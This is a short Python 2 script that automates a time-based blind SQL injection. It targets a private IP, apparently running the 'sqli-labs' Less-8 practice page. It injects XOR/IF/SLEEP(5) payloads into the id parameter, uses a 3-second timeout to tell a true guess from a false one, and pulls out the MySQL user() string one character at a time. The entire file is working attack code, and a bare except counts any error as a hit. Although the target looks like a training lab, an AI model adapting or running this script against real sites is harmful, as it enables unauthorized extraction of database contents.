#encoding=utf-8
import httplib
import time
import string
import sys
import random
import urllib
headers = { "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36" } 
payloads = 'abcdefghijklmnopqrstuvwxyz0123456789@_.'
print '[%s] Start to retrive MySQL User:' % time.strftime('%H:%M:%S', time.localtime())
user = ''
for i in range(1, 24):
    for payload in payloads:
        try:
            s = "ascii(mid(lower(user()),%s,1))=%s" % (i, ord(payload))
            s = "aaa'XOR(if(%s,sleep(5),0))OR'bbb" % s
            conn = httplib.HTTPConnection('192.168.116.145', timeout=3)
            conn.request(method='GET',url="/sqli/Less-8/?id=%s" % urllib.quote(s))
            conn.getresponse()
            conn.close()
            print '.',
        except:
            user += payload
            print '\n[in progress]', user,
            time.sleep(5.0)
            break
print '\n[Done] MySQL user is %s' % user